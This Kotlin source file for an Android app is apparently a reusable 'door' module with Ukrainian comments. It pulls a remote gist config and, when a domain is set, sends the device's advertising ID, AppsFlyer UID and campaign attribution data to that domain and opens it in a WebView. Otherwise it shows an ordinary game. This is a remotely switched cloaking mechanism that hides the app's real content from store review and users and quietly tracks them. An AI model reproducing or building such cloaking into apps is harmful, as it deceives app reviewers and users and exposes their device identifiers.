package com.easy.peasy

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

/**
 * Копіпаст-френдлі «двері».
 * - якщо у prefs вже є "Opened_Link" → одразу відкриває WebActivity з цим URL
 * - інакше тягне gist (af_dev_key, domain | або link), чекає AppsFlyer і збирає ПОВНИЙ URL
 * - у URL передає: uuid (AF UID), ad_id (GAID), та ВСІ пари з onConversionDataSuccess (включно з subN)
 * - зберігає у prefs як "Opened_Link"
 */
object Door {
    private const val PREFS = "prefs"
    private const val KEY_OPENED = "Opened_Link"

    /**
     * @param gistUrl     URL гіста з полями: "af_dev_key", "domain" (або "link" — готовий URL)
     * @param killPath    фрагмент URL, при якому WebActivity відкриє гру (kill-маркер)
     * @param webActivity клас веб-активності (за замовчуванням WebActivity)
     * @param gameActivity клас ігрової активності (за замовчуванням AppActivity)
     */

    fun start(
        splash: Activity,
        gistUrl: String,
        killPath: String,
        webActivity: Class<out Activity> = WebActivity::class.java,
        gameActivity: Class<out Activity> = MainActivity::class.java
    ) {
        // (не обов’язково) тримаємо splash, щоб потім можна було красиво закрити з WebActivity
        SplashKeeper.hold(splash)

        CoroutineScope(Dispatchers.Main).launch {
            when (val r = resolve(splash, gistUrl)) {
                is Result.Web -> {
                    val i = Intent(splash, webActivity)
                        .putExtra(WebActivity.Companion.EXTRA_URL, r.url)
                        .putExtra(WebActivity.Companion.EXTRA_KILL, killPath)
                        .putExtra(WebActivity.Companion.EXTRA_GAME, gameActivity.name)
                    splash.startActivity(i)
                    splash.overridePendingTransition(0, 0)
                }
                Result.App -> {
                    splash.startActivity(Intent(splash, gameActivity))
                    splash.finish()
                }
            }
        }
    }

    // -------------------- внутрішнє --------------------

    private sealed class Result {
        data class Web(val url: String) : Result()
        data object App : Result()
    }

    private data class GistData(
        val afKey: String?,
        val domain: String
    )

    private suspend fun resolve(ctx: Context, gistUrl: String): Result {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

        // 1) якщо вже збережено — віддаємо одразу
        prefs.getString(KEY_OPENED, null)?.let { saved ->
           // Log.d("Door", "from prefs: $saved")
            return Result.Web(saved)
        }

        // 2) тягнемо гіcт
        val data = withContext(Dispatchers.IO) { fetchGist(gistUrl) } ?: return Result.App

        // 🔹 AFF-CASE: є link, а af_dev_key порожній → не запускаємо AppsFlyer, будуємо aff-URL і віддаємо Web
        if (data.domain?.isNotBlank() == true && (data.afKey == null || data.afKey.isBlank())) {
            return try {
                val gaid = withContext(Dispatchers.IO) {
                    try {
                        AdvertisingIdClient.getAdvertisingIdInfo(ctx.applicationContext)?.id.orEmpty()
                    } catch (_: Exception) { "" }
                }
                val base = data.domain.replace(" ", "_")
                val url = if (gaid.isNotBlank()) {
                    val sep = if (base.contains("?")) "&" else "?"
                    "$base${sep}ad_id=$gaid"
                } else base

                // зберігаємо у ті ж prefs, що й інші гілки
                prefs.edit().putString(KEY_OPENED, url).apply()
                Log.d("Door", "aff url (saved): $url")
                Result.Web(url)
            } catch (t: Throwable) {
                Log.d("Door", "aff-case failed, fallback to plain link", t)
                val plain = data.domain.replace(" ", "_")
                prefs.edit().putString(KEY_OPENED, plain).apply()
                Result.Web(plain)
            }
        }

        // 3) AppsFlyer + збір параметрів (ПОВНИЙ набір)
        return suspendCoroutine { cont ->
            // Guard: no AF without a dev key
            if (data.afKey.isNullOrBlank()) {
                cont.resume(Result.App)
                return@suspendCoroutine
            }

            val once = AtomicBoolean(false)

            val listener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(map: MutableMap<String, Any>?) {
                    if (once.getAndSet(true)) return
                    if (map == null) {
                        cont.resume(Result.App); return
                    }

                    Log.d("Door", "map $map")

                    val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(ctx).orEmpty()
                    val adId = try {
                        AdvertisingIdClient.getAdvertisingIdInfo(ctx.applicationContext)?.id ?: ""
                    } catch (_: Exception) {
                        ""
                    }

                    val base = data.domain
                    if (base.isBlank()) {
                        cont.resume(Result.App); return
                    }
                    Log.d("Door", "base $base")

                    // Хелпер для encode
                    fun enc(s: String): String =
                        try {
                            URLEncoder.encode(s, "UTF-8")
                        } catch (_: Exception) {
                            s
                        }

                    // regex для subN і af_subN
                    val subRegex = Regex("^(?:af_)?sub\\d+$", RegexOption.IGNORE_CASE)

                    // відкидаємо null / пусті значення
                    val entries = map.entries
                        .filter { it.value != null && it.value.toString().isNotBlank() }
                        .toList()

                    val others = entries.filterNot { subRegex.matches(it.key) }
                    val subs = entries.filter { subRegex.matches(it.key) }
                        .sortedBy { it.key.lowercase().removePrefix("af_") }

                    Log.d("Door", "subs $subs")

                    val hasQuery = base.contains("?")
                    val sb = StringBuilder().apply {
                        append(base)
                        if (!hasQuery) append("?") else if (!base.endsWith("&") && !base.endsWith("?")) append(
                            "&"
                        )

                        append("uuid=").append(enc(afId))
                        append("&ad_id=").append(enc(adId))

                        // інші ключі (utm*, af_status, campaign, тощо)
                        for ((k, v) in others) {
                            append("&").append(enc(k)).append("=").append(enc(v.toString()))
                        }

                        // sub1..subN
                        for ((k, v) in subs) {
                            val key = k.lowercase().removePrefix("af_") // af_sub1 -> sub1
                            append("&").append(enc(key)).append("=").append(enc(v.toString()))
                        }
                    }

                    val url = sb.toString()
                    Log.d("Door", "url: $url")

                    prefs.edit().putString(KEY_OPENED, url).apply()
                    cont.resume(Result.Web(url))
                }

                override fun onConversionDataFail(p0: String?) {
                    if (once.getAndSet(true)) return
                    cont.resume(Result.App)
                }

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
                override fun onAttributionFailure(p0: String?) {}
            }

            AppsFlyerLib.getInstance().apply {
                init(data.afKey ?: "", listener, ctx)
                start(ctx, data.afKey ?: "", object : AppsFlyerRequestListener {
                    override fun onSuccess() {
                        Log.d("Door", "AF start ok")
                    }

                    override fun onError(code: Int, desc: String) {
                        if (once.getAndSet(true)) return
                        Log.d("Door", "AF start error: $code $desc")
                        cont.resume(Result.App)
                    }
                })
                setDebugLog(true)
            }
        }
    }

    private fun fetchGist(url: String): GistData? = try {
        val c = (URL(url).openConnection() as HttpURLConnection).apply {
            connectTimeout = 5000
            readTimeout = 5000
        }
        if (c.responseCode == HttpURLConnection.HTTP_OK) {
            val txt = c.inputStream.bufferedReader().use { it.readText() }
            val j = JSONObject(txt)

            val af = j.optString("af_dev_key", null)
            val domain = j.optString("domain", "")
            Log.d("Door", "AF kay: $af")
            Log.d("Door", "AF domain: $domain")
            if (domain.isNotBlank())
                GistData(af, domain)
            else
                null
        } else null
    } catch (_: Exception) { null }

}